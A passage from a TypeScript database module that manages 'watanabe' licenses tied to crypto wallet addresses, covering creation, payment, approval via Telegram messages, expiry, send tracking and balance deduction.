  }
  return parts.join('-')
}

export function watanabeCreateLicense(
  walletAddress: string,
  plan: '24h' | '1week' | '1month',
  paymentAsset: string,
  paymentAmount: number,
  paymentAddress: string,
  sendLimit: number,
): string {
  const id = generateStrongLicenseKey()
  watanabeStmts.insertLicense.run(
    id,
    walletAddress.toLowerCase(),
    plan,
    'pending_payment',
    paymentAsset,
    paymentAmount,
    paymentAddress,
    sendLimit,
    Date.now(),
  )
  return id
}

export function watanabeMarkLicensePaid(licenseId: string): boolean {
  const result = watanabeStmts.markLicensePaid.run(licenseId)
  return result.changes > 0
}

export function watanabeApproveLicense(licenseId: string): boolean {
  const row = db.prepare('SELECT * FROM watanabe_licenses WHERE id = ?').get(licenseId) as
    | Record<string, unknown>
    | undefined
  if (!row) {
    return false
  }
  const plan = row.plan as string
  const now = Date.now()
  let expiresAt = now
  if (plan === '24h') {
    expiresAt = now + 24 * 60 * 60 * 1000
  } else if (plan === '1week') {
    expiresAt = now + 7 * 24 * 60 * 60 * 1000
  } else if (plan === '1month') {
    expiresAt = now + 30 * 24 * 60 * 60 * 1000
  }
  const result = watanabeStmts.approveLicense.run(now, expiresAt, licenseId)
  return result.changes > 0
}

export function watanabeRejectLicense(licenseId: string): boolean {
  const result = watanabeStmts.rejectLicense.run(licenseId)
  return result.changes > 0
}

export function watanabeGetActiveLicense(walletAddress: string): WatanabeLicense | null {
  // First expire old licenses
  watanabeStmts.expireOldLicenses.run(Date.now())
  const row = watanabeStmts.getActiveLicense.get(walletAddress.toLowerCase(), Date.now()) as
    | Record<string, unknown>
    | undefined
  if (!row) {
    return null
  }
  return mapLicenseRow(row)
}

export function watanabeGetPendingLicense(walletAddress: string): WatanabeLicense | null {
  const row = watanabeStmts.getPendingLicense.get(walletAddress.toLowerCase()) as Record<string, unknown> | undefined
  if (!row) {
    return null
  }
  return mapLicenseRow(row)
}

export function watanabeSetLicenseTelegramMsg(licenseId: string, messageId: number): void {
  watanabeStmts.setLicenseTelegramMsg.run(messageId, licenseId)
}

export function watanabeGetLicenseByTelegramMsg(messageId: number): WatanabeLicense | null {
  const row = watanabeStmts.getLicenseByTelegramMsg.get(messageId) as Record<string, unknown> | undefined
  if (!row) {
    return null
  }
  return mapLicenseRow(row)
}

export function watanabeUpdateLicenseSent(licenseId: string, amount: number): void {
  watanabeStmts.updateLicenseTotalSent.run(amount, licenseId)
}

export function watanabeGetUserLicenses(walletAddress: string): WatanabeLicense[] {
  const rows = watanabeStmts.getUserLicenses.all(walletAddress.toLowerCase()) as Array<Record<string, unknown>>
  return rows.map(mapLicenseRow)
}

export function watanabeGetLicenseById(licenseId: string): WatanabeLicense | null {
  const row = db.prepare('SELECT * FROM watanabe_licenses WHERE id = ?').get(licenseId) as
    | Record<string, unknown>
    | undefined
  if (!row) {
    return null
  }
  return mapLicenseRow(row)
}

export function watanabeUpdateLicenseRequestMeta(
  licenseId: string,
  ip: string,
  userAgent: string,
  country: string,
): void {
  watanabeStmts.updateLicenseRequestMeta.run(ip, userAgent, country, licenseId)
}

export function watanabeDeductBalance(asset: string, amount: number): void {
  const key = `watanabeBalance${asset}`
  const current = getSetting(key)
  const currentNum = Number(current) || 0
  const newBalance = Math.max(0, currentNum - amount)
  saveSetting(key, newBalance)
}

// ─── Database cleanup ────────────────────────────────────────────────────────

export function closeDatabase(): void {
  db.close()
}

export default db
